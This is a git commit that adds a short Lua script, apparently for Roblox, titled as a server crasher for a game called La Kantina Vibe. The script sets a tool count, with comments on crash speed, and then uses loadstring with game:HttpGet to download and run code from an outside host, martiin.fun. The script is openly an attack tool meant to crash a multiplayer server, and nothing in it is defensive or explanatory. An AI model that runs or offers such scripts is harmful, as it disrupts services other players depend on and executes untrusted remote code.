4de4e08780c1f48fb10e0e56cc7c0c39f7386d84
Emil Toth <emiltoth1870@gmail.com>
2023-03-08 18:45:59 +0100

    Updated automatically!

---
+++ Scripts/Autoadd/La Kantina Vibe Server Crasher.lua
@@ -0,0 +1,4 @@
+--try 800 tools (fast crasher but crashes may not function as if )
+--1280 tools (safe crash)
+getgenv().tools = 1280
+loadstring(game:HttpGet('https://martiin.fun/scripts/kantinacrash.lua'))()
